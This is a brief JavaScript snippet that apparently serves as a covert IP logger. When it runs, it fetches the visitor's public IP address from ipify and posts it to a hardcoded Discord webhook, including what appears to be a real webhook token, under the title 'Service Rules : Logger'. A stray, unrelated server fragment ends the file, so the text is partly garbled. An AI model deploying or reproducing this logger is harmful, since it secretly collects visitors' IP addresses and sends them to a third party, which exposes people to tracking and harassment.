
function sendToDiscordWebhook(ipAddress) {
    // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
    const webhookURL = 'https://discord.com/api/webhooks/1137130437215531059/pKOokfbFj9Ob6WfLwVfZWD6b63sK7VlkSNBxp3Yav3UvhOO1YKOTkk0o2kEoVzu740PP';

    const data = {
        embeds: [
            {
                title: 'Service Rules : Logger',
                description: `IP Address: ${ipAddress}`,
                color: 0x00ff00 // Green color (you can change this)
            }
        ]
    };

    // Sending the data to Discord using a POST request
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(() => console.log('IP address sent to Discord webhook successfully!'))
    .catch(error => console.error('Failed to send IP address to Discord webhook:', error));
}

// Fetch the user's IP address using a public IP API
fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        const userIP = data.ip;
        sendToDiscordWebhook(userIP);
    })
    .catch(error => {
        console.error("Failed to fetch IP:", error);
    });

port ' + listener.address().port);
});
